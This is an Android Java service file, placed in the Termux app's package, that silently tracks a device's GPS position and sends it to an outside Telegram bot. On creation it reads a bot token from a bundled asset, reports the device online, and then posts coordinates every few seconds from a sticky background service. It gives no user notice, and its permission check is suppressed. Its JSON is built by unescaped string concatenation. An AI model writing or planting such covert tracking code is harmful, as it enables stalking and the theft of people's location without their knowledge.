package com.termux.app;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Properties;
import java.util.Scanner;

public class TelegramBotService extends Service {
    private String botToken;
    private static final String TAG = "TelegramBotService";
    private LocationManager locationManager;
    private String chatId = "FIXME_USER_CHAT_ID"; // We should ideally get this dynamically or hardcode if known

    @Override
    public void onCreate() {
        super.onCreate();
        loadToken();
        sendStatus("Online");
        startLocationTracking();
    }

    private void loadToken() {
        try {
            InputStream is = getAssets().open(".env");
            Properties prop = new Properties();
            prop.load(is);
            botToken = prop.getProperty("TELEGRAM_BOT_TOKEN");
            is.close();
        } catch (Exception e) {
            Log.e(TAG, "Error loading token", e);
        }
    }

    private void sendStatus(String status) {
        sendMessage("Device Status: " + status);
    }

    private void sendMessage(final String message) {
        if (botToken == null) return;
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                String json = "{\"chat_id\":\"" + chatId + "\", \"text\":\"" + message + "\"}";
                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    @SuppressLint("MissingPermission")
    private void startLocationTracking() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendMessage("Location: " + location.getLatitude() + ", " + location.getLongitude());
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            });
        } catch (Exception e) {
            Log.e(TAG, "Location error", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        sendStatus("Offline");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}